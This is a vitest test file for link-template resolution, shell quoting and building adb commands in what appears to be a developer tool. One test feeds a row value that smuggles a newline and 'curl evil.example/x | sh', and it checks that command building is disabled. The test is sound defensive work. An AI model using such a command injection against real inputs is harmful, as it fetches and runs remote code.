import { describe, expect, test } from 'vitest';
import { buildExecCommand, resolveLinkTemplate, shellQuote } from './format';
import type { EntityLink } from './api/types';

describe('resolveLinkTemplate', () => {
  test('substitutes {{column}} placeholders from the row', () => {
    const url = resolveLinkTemplate('http://localhost:3000/modules?gadgetId={{gadget_id}}', {
      gadget_id: 'abc123',
    });
    expect(url).toBe('http://localhost:3000/modules?gadgetId=abc123');
  });

  test('resolves a placeholder naming a missing column to empty string', () => {
    const url = resolveLinkTemplate('acmewallet://card?token={{missing}}', { gadget_id: 'abc123' });
    expect(url).toBe('acmewallet://card?token=');
  });

  test('resolves a nullish column value to empty string', () => {
    const url = resolveLinkTemplate('x={{a}}', { a: null });
    expect(url).toBe('x=');
  });
});

describe('shellQuote', () => {
  test('wraps a plain string in single quotes', () => {
    expect(shellQuote('myapp://widget/abc')).toBe("'myapp://widget/abc'");
  });

  test('escapes an embedded single quote with the POSIX idiom', () => {
    expect(shellQuote("it's here")).toBe(`'it'\\''s here'`);
  });

  test('preserves shell metacharacters as literal text inside the quotes', () => {
    expect(shellQuote('myapp://widget?a=1&b=2')).toBe("'myapp://widget?a=1&b=2'");
  });
});

describe('buildExecCommand', () => {
  const adbLink: EntityLink = {
    label: 'Open on Android',
    template: 'myapp://widget/{{widget_token}}',
    kind: 'exec',
    argv: ['adb', 'shell', 'am', 'start', '-a', 'android.intent.action.VIEW', '-d', '{{url}}'],
  };

  test('builds a fully quoted command for a normal row', () => {
    const result = buildExecCommand(adbLink, { widget_token: 'abc123' });
    expect(result).toEqual({
      command: "adb shell am start -a android.intent.action.VIEW -d 'myapp://widget/abc123'",
    });
  });

  test('quotes a resolved URL containing & and ? so it survives a shell paste as one argument', () => {
    const link: EntityLink = { ...adbLink, template: 'myapp://widget?a={{a}}&b={{b}}' };
    const result = buildExecCommand(link, { a: '1', b: '2' });
    expect(result).toEqual({
      command: "adb shell am start -a android.intent.action.VIEW -d 'myapp://widget?a=1&b=2'",
    });
  });

  test('escapes an embedded single quote in a row value rather than rejecting it', () => {
    const result = buildExecCommand(adbLink, { widget_token: "o'brien" });
    expect(result).toEqual({
      command: `adb shell am start -a android.intent.action.VIEW -d 'myapp://widget/o'\\''brien'`,
    });
  });

  test('disables with a reason when the resolved command contains a control character', () => {
    const result = buildExecCommand(adbLink, { widget_token: 'abc\ncurl evil.example/x | sh' });
    expect(result).toEqual({ disabledReason: 'row value contains a control character' });
  });

  test('disables with a reason naming the column when a template column is missing from the row', () => {
    const result = buildExecCommand(adbLink, {});
    expect(result).toEqual({ disabledReason: 'row is missing "widget_token"' });
  });

  test('disables with a reason when a template column resolves to an empty string', () => {
    const result = buildExecCommand(adbLink, { widget_token: '' });
    expect(result).toEqual({ disabledReason: 'row is missing "widget_token"' });
  });

  test('does not quote literal argv elements from the command table', () => {
    const result = buildExecCommand(adbLink, { widget_token: 'abc123' });
    expect((result as { command: string }).command).toContain('-a android.intent.action.VIEW');
  });
});
